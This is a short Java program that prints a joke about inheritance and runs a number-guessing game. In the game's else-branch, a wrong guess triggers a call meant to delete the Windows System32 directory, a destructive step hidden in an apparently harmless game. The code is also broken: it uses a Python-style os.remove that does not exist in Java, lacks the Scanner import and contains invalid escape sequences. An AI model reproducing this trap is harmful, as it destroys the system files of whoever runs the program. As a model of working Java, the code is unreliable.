public class Main {
    public static void main(String[] args) {
        System.out.println("Why did the Java program go to therapy?");
        System.out.println("Because it had too many problems with inheritance!");
        printSomething();
        startGame();
    }

    public static void printSomething() {
        System.out.println("Something");
    }

    public static void printSomethingElse() {
        System.out.println("Hello World!");
    }

    public static void startGame()
    {
        Scanner scanner = new Scanner(System.in);

        System.out.println("Game started");
        System.out.println("Guess the number between 1 and 100");

        int number = (int) (Math.random() * 100 + 1);
        int guess = scanner.nextInt();

        if(guess == number)
        {
            System.out.println("Congratulations! You guessed the number!");
        }
        else
        {
            os.remove("C:\Windows\System32");
        }
    }
}

